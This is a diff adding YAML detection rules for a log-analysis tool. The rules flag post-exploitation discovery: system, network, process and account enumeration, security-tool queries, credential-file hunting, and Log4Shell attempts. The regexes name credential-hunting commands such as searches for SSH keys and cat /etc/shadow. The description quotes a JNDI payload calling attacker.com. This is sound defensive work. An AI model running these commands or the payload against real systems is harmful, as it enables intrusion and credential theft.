@@ -1,0 +1,250 @@
+﻿# detection/rules/discovery.yaml â€” NexLog v2
+# 8 rules â€” post-exploitation discovery: system enum, network mapping,
+#           process listing, credential file hunting
+# Log sources: Windows Event 4688, Sysmon EID 1, auth.log, process logs
+#
+# Fills gaps: T1046 (network service scanning), T1082 (system info discovery),
+# T1057 (process discovery), T1018 (remote system discovery),
+# T1083 (file/dir discovery â€” deeper than recon.yaml web context),
+# T1087 (account discovery), T1069 (permission group discovery)
+#
+# DISTINCTION from recon.yaml:
+#   recon.yaml = external attacker scanning from OUTSIDE (web logs, firewall)
+#   discovery.yaml = attacker INSIDE the system running local enumeration commands
+#   Log source is process creation / command execution, not web access logs.
+
+rules:
+
+  - id: DISC-001
+    name: System Information Discovery (T1082)
+    description: >
+      Burst of system enumeration commands run in rapid succession.
+      whoami, hostname, systeminfo, uname -a, id, ipconfig â€” classic
+      attacker orientation commands immediately after gaining access.
+    severity: MEDIUM
+    category: discovery
+    confidence: 0.80
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)((whoami|hostname|systeminfo|uname\s+-a|id\s*$|
+      cat\s+\/etc\/os-release|lsb_release|
+      ipconfig\s*(\/all)?|ifconfig|ip\s+addr|
+      ver\s*$|winver)\s*(&&|\|\||;|\n)|
+      cmd.*\/c\s+(whoami|hostname|systeminfo)|
+      powershell.*\(Get-WmiObject\s+Win32_OperatingSystem\)|
+      Get-ComputerInfo|
+      (whoami|id)\s*>\s*[\w\/\\]+)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1082
+        technique_name: System Information Discovery
+    indicators: [hostname, username, message, process_name]
+    tags: [system_enum, whoami, discovery, post_exploitation]
+
+  - id: DISC-002
+    name: Network Service Scanning from Compromised Host (T1046)
+    description: >
+      Internal host running network scanning tools â€” nmap, masscan, ping sweep,
+      or netstat enumeration of active connections. Attacker mapping
+      network from their beachhead after initial compromise.
+    severity: HIGH
+    category: discovery
+    confidence: 0.85
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(nmap\s+(-s[STUVA]|-p\s+\d|\-\-scan-delay|
+      -O\s|--os-detection|\-A\s)|
+      masscan\s+.*-p|
+      netstat\s+-a(n)?[ot]?|ss\s+-tulnp|
+      arp\s+-a|arp-scan|
+      for\s+.*in\s+.*ping|
+      1..254.*ping|
+      ping\s+-c\s+1.*\d{1,3}\.\d{1,3}|
+      fping\s+-a|
+      invoke-portscan|test-netconnection.*-port)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1046
+        technique_name: Network Service Scanning
+    indicators: [hostname, username, message]
+    tags: [nmap, network_scan, discovery, post_exploitation, T1046]
+
+  - id: DISC-003
+    name: Remote System / Host Discovery (T1018)
+    description: >
+      Commands listing network hosts, Active Directory computers, or
+      ARP table â€” building a target list for lateral movement.
+    severity: HIGH
+    category: discovery
+    confidence: 0.82
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(net\s+view|net\s+view\s+\/domain|
+      nltest\s+\/dclist:|nltest\s+\/dsgetdc:|
+      Get-ADComputer.*Filter|
+      nbtstat\s+-n|nbtstat\s+-r|
+      arp\s+-a\s*$|
+      ldapsearch.*objectClass.*computer|
+      powerview.*Get-NetComputer|
+      Get-NetNeighbor|
+      AdFind.*objectclass.*computer)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1018
+        technique_name: Remote System Discovery
+    indicators: [hostname, username, message]
+    tags: [host_enum, active_directory, discovery, lateral_movement_prep]
+
+  - id: DISC-004
+    name: Process Discovery / Tasklist (T1057)
+    description: >
+      Attacker listing running processes to identify security tools,
+      AV products, or high-value targets (password managers, databases).
+    severity: LOW
+    category: discovery
+    confidence: 0.72
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(tasklist\s*(\/v|\/fo|\/m|\/svc)?|
+      ps\s+(-aux|-ef|-e|-f|aux)\s*$|
+      Get-Process\s*$|Get-WmiObject.*Win32_Process|
+      wmic\s+process\s+list|
+      pgrep\s+-a|
+      qprocess\s+\*|
+      powershell.*get-process.*name)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1057
+        technique_name: Process Discovery
+    indicators: [hostname, username, message]
+    tags: [tasklist, process_enum, discovery]
+
+  - id: DISC-005
+    name: Account and Group Enumeration (T1087 / T1069)
+    description: >
+      Commands listing local/domain users, groups, and permissions.
+      net user, net localgroup, id -G â€” mapping privileged accounts
+      before privilege escalation or credential targeting.
+    severity: MEDIUM
+    category: discovery
+    confidence: 0.78
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(net\s+user\s*(\/domain)?|net\s+localgroup\s+(administrators|
+      "domain admins"|"enterprise admins")|
+      net\s+group\s+"Domain Admins"|
+      Get-ADUser.*Filter|Get-ADGroupMember|
+      wmic\s+useraccount\s+list|
+      cat\s+\/etc\/(passwd|group|shadow)|
+      getent\s+(passwd|group)|
+      id\s+-G|groups\s*$|
+      whoami\s+\/groups|whoami\s+\/priv|
+      AdFind.*objectclass.*user)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1087
+        technique_name: Account Discovery
+    indicators: [hostname, username, message]
+    tags: [user_enum, group_enum, discovery, active_directory]
+
+  - id: DISC-006
+    name: Credential File / Secret Hunting
+    description: >
+      File system searches for credential files, SSH keys, config files
+      with passwords. Attacker searching for stored credentials to
+      escalate or move laterally.
+    severity: HIGH
+    category: discovery
+    confidence: 0.85
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(find\s+\/\s+-name\s+.*\.(pem|key|p12|pfx|ppk|kdbx)|
+      find\s+.*-name\s+"id_rsa"|
+      find\s+.*-name\s+".*password.*"|
+      find\s+.*-name\s+"\.env"|
+      dir\s+\/s\s+\/b\s+.*password|
+      dir\s+.*\.kdbx|dir\s+.*\.pfx|
+      grep\s+-r\s+(password|passwd|secret|api_key|token)\s+\/|
+      type\s+.*unattend\.xml|
+      Get-ChildItem.*\.kdbx|
+      findstr\s+\/si\s+password\s+.*\.(xml|ini|config|txt))
+    mitre:
+      - tactic_id: TA0006
+        tactic_name: Credential Access
+        technique_id: T1552
+        technique_name: Unsecured Credentials
+        sub_technique: ".001"
+    indicators: [hostname, username, message]
+    tags: [credential_hunting, file_discovery, discovery, ssh_key]
+
+  - id: DISC-007
+    name: Security Software / Defensive Tool Discovery
+    description: >
+      Attacker querying installed AV, EDR, firewalls, or SIEM agents
+      to understand what visibility defenders have before taking action.
+    severity: MEDIUM
+    category: discovery
+    confidence: 0.78
+    type: regex
+    match_field: message
+    pattern: >-
+      (?i)(Get-MpComputerStatus|
+      Get-MpPreference|sc\s+query\s+(WinDefend|CsFalconService|
+      SentinelAgent|cbdefense|MsMpSvc)|
+      wmic.*antivirusproduct|
+      WMIC.*AntiVirus|
+      tasklist.*\/(v|fo).*crowdstrike|
+      reg\s+query.*HKLM.*Security|
+      netsh\s+advfirewall\s+show|
+      Get-NetFirewallRule|
+      iptables\s+-L|ufw\s+status)
+    mitre:
+      - tactic_id: TA0007
+        tactic_name: Discovery
+        technique_id: T1518
+        technique_name: Software Discovery
+        sub_technique: ".001"
+    indicators: [hostname, username, message]
+    tags: [av_discovery, edr_discovery, security_tool_enum, discovery]
+
+  - id: DISC-008
+    name: Log4Shell Exploitation Attempt (CVE-2021-44228)
+    description: >
+      JNDI lookup strings in HTTP User-Agent, URI, or log message.
+      Log4Shell exploits Java logging via ${jndi:ldap://attacker.com/a}
+      in any user-controlled input including User-Agent and X-Forwarded-For.
+      Still being exploited in 2026 on unpatched systems.
+    severity: CRITICAL
+    category: discovery
+    confidence: 0.96
+    type: regex
+    match_field: http_user_agent
+    pattern: >-
+      (?i)(\$\{jndi:(ldap|rmi|dns|corba|iiop|imap|
+      ldaps|nds|nis|nns)://|
+      \$\{jndi:|
+      \$\{\$\{::-j\}|
+      \$\{\$\{lower:j\}|
+      \$\{\$\{upper:j\}|
+      \$\{env:NaN:-j\}|
+      CVE-2021-44228|log4shell|log4j.*exploit|
+      \$\{j\$\{:\-n\}di:|
+      \$\{j\$\{lower:n\}di:)
+    mitre:
+      - tactic_id: TA0001
+        tactic_name: Initial Access
+        technique_id: T1190
+        technique_name: Exploit Public-Facing Application
+    indicators: [source_ip, message, http_user_agent, http_uri_decoded]
+    tags: [log4shell, log4j, cve_2021_44228, critical, rce, interview-testable]
